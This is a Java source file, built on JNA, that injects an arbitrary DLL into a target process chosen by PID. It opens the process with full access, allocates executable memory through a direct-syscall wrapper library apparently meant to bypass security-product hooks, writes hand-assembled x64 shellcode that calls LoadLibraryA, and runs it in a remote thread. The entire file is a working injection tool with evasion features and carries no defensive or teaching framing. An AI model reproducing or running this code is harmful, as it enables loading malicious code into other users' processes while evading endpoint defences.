import com.sun.jna.*;
import com.sun.jna.ptr.*;

public class InjectDLL {
    public interface Kernel32 extends Library {
        Kernel32 INSTANCE = Native.load("kernel32", Kernel32.class);

        int PROCESS_ALL_ACCESS = 0x1F0FFF;
        int WAIT_OBJECT_0 = 0x00000000;

        Pointer OpenProcess(int dwDesiredAccess, boolean bInheritHandle, int dwProcessId);
        boolean CloseHandle(Pointer hObject);
        Pointer GetModuleHandleA(String name);
        Pointer GetProcAddress(Pointer hModule, String name);
        int WaitForSingleObject(Pointer hHandle, int dwMilliseconds);
        int GetLastError();
        int GetFullPathNameA(String lpFileName, int nBufferLength, byte[] lpBuffer, PointerByReference lpFilePart);
    }

    public interface SysCaller extends Library {
        SysCaller INSTANCE = Native.load("SysCaller", SysCaller.class);

        int SysAllocateVirtualMemoryEx(Pointer hProcess,
                                       PointerByReference baseAddress,
                                       SizeTByReference regionSize,
                                       int allocationType,
                                       int protect,
                                       Pointer extendedParams,
                                       int paramCount);

        int SysWriteVirtualMemory(Pointer hProcess,
                                  Pointer baseAddress,
                                  Pointer buffer,
                                  NativeLong bufferSize,
                                  SizeTByReference bytesWritten);

        int SysCreateThreadEx(PointerByReference threadHandle,
                               int desiredAccess,
                               Pointer objectAttributes,
                               Pointer processHandle,
                               Pointer startRoutine,
                               Pointer argument,
                               int createFlags,
                               NativeLong zeroBits,
                               NativeLong stackSize,
                               NativeLong maxStackSize,
                               Pointer attributeList);

        int SysClose(Pointer handle);
    }

    private static boolean NT_SUCCESS(int status) {
        return status >= 0;
    }

    public static class SizeTByReference extends ByReference {
        public SizeTByReference() { super(NativeLong.SIZE); setValue(new NativeLong(0)); }
        public SizeTByReference(NativeLong value) { super(NativeLong.SIZE); setValue(value); }
        public void setValue(NativeLong value) {
            if (NativeLong.SIZE == 8) getPointer().setLong(0, value.longValue());
            else getPointer().setInt(0, value.intValue());
        }
        public NativeLong getValue() {
            return new NativeLong(NativeLong.SIZE == 8 ? getPointer().getLong(0) : getPointer().getInt(0));
        }
    }

    public static boolean injectDLL(Pointer hProcess, String dllPath) {
        Kernel32 k32 = Kernel32.INSTANCE;
        SysCaller sc = SysCaller.INSTANCE;

        byte[] buf = new byte[260];
        int n = k32.GetFullPathNameA(dllPath, buf.length, buf, null);
        String abs = (n > 0 && n < buf.length) ? new String(buf, 0, n) : dllPath;
        byte[] pathBytes = (abs + "\0").getBytes();

        PointerByReference baseRef = new PointerByReference();
        SizeTByReference region = new SizeTByReference(new NativeLong(pathBytes.length));
        int status = sc.SysAllocateVirtualMemoryEx(
                hProcess, baseRef, region, 0x3000, 0x40, Pointer.NULL, 0);
        if (!NT_SUCCESS(status)) {
            System.out.printf("[!] Failed to allocate path. Status: 0x%08X\n", status);
            return false;
        }
        Pointer base = baseRef.getValue();
        System.out.printf("[+] Allocated DLL path memory at: 0x%016X\n", Pointer.nativeValue(base));

        Memory localPath = new Memory(pathBytes.length);
        localPath.write(0, pathBytes, 0, pathBytes.length);
        SizeTByReference written = new SizeTByReference();
        status = sc.SysWriteVirtualMemory(hProcess, base, localPath, new NativeLong(pathBytes.length), written);
        if (!NT_SUCCESS(status) || written.getValue().longValue() != pathBytes.length) {
            System.out.printf("[!] Failed to write DLL path. Status: 0x%08X, Bytes written: %d\n", status, written.getValue().longValue());
            return false;
        }
        System.out.println("[+] Successfully wrote DLL path to memory");

        Pointer hKernel32 = k32.GetModuleHandleA("kernel32.dll");
        if (hKernel32 == null) {
            System.out.println("[!] Failed to get kernel32.dll handle");
            return false;
        }
        Pointer loadLibrary = k32.GetProcAddress(hKernel32, "LoadLibraryA");
        if (loadLibrary == null) {
            System.out.println("[!] Failed to get LoadLibraryA address");
            return false;
        }
        System.out.printf("[+] LoadLibraryA address: 0x%016X\n", Pointer.nativeValue(loadLibrary));

        byte[] scode = new byte[1 + 3 + 2 + 8 + 2 + 8 + 2 + 4 + 1];
        int i = 0;
        scode[i++] = 0x48; scode[i++] = (byte)0x83; scode[i++] = (byte)0xEC; scode[i++] = 0x28;
        scode[i++] = 0x48; scode[i++] = (byte)0xB9;
        long pathAddr = Pointer.nativeValue(base);
        for (int b = 0; b < 8; b++) scode[i++] = (byte)((pathAddr >>> (8*b)) & 0xFF);
        scode[i++] = 0x48; scode[i++] = (byte)0xB8;
        long llAddr = Pointer.nativeValue(loadLibrary);
        for (int b = 0; b < 8; b++) scode[i++] = (byte)((llAddr >>> (8*b)) & 0xFF);
        scode[i++] = (byte)0xFF; scode[i++] = (byte)0xD0;
        scode[i++] = 0x48; scode[i++] = (byte)0x83; scode[i++] = (byte)0xC4; scode[i++] = 0x28;
        scode[i++] = (byte)0xC3;

        PointerByReference shellRef = new PointerByReference();
        region = new SizeTByReference(new NativeLong(scode.length));
        status = sc.SysAllocateVirtualMemoryEx(hProcess, shellRef, region, 0x3000, 0x40, Pointer.NULL, 0);
        if (!NT_SUCCESS(status)) {
            System.out.printf("[!] Failed to allocate shellcode. Status: 0x%08X\n", status);
            return false;
        }
        Pointer shell = shellRef.getValue();
        System.out.printf("[+] Allocated shellcode memory at: 0x%016X\n", Pointer.nativeValue(shell));
        Memory scMem = new Memory(scode.length);
        scMem.write(0, scode, 0, scode.length);
        written = new SizeTByReference();
        status = sc.SysWriteVirtualMemory(hProcess, shell, scMem, new NativeLong(scode.length), written);
        if (!NT_SUCCESS(status) || written.getValue().longValue() != scode.length) {
            System.out.printf("[!] Failed to write shellcode. Status: 0x%08X, Bytes written: %d\n", status, written.getValue().longValue());
            return false;
        }
        System.out.println("[+] Successfully wrote shellcode");

        PointerByReference hThreadRef = new PointerByReference();
        status = sc.SysCreateThreadEx(hThreadRef, 0x1FFFFF, Pointer.NULL, hProcess, shell, Pointer.NULL,
                0, new NativeLong(0), new NativeLong(0), new NativeLong(0), Pointer.NULL);
        Pointer hThread = hThreadRef.getValue();
        if (!NT_SUCCESS(status) || hThread == null) {
            System.out.printf("[!] Failed to create remote thread. Status: 0x%08X, Handle: %s\n", status, String.valueOf(hThread));
            return false;
        }
        System.out.printf("[+] Created remote thread: 0x%016X\n", Pointer.nativeValue(hThread));

        k32.WaitForSingleObject(hThread, 5000);
        sc.SysClose(hThread);
        System.out.printf("[+] Successfully injected %s!\n", dllPath);
        return true;
    }

    public static void main(String[] args) {
        if (args.length != 2) {
            System.out.println("Usage: java InjectDLL <pid> <dll_path>");
            return;
        }
        int pid = Integer.parseInt(args[0]);
        String dll = args[1];
        Kernel32 k32 = Kernel32.INSTANCE;
        Pointer hProcess = k32.OpenProcess(Kernel32.PROCESS_ALL_ACCESS, false, pid);
        if (hProcess == null) {
            System.out.printf("[!] Failed to open process %d\n", pid);
            return;
        }
        try {
            injectDLL(hProcess, dll);
        } finally {
            k32.CloseHandle(hProcess);
        }
    }
}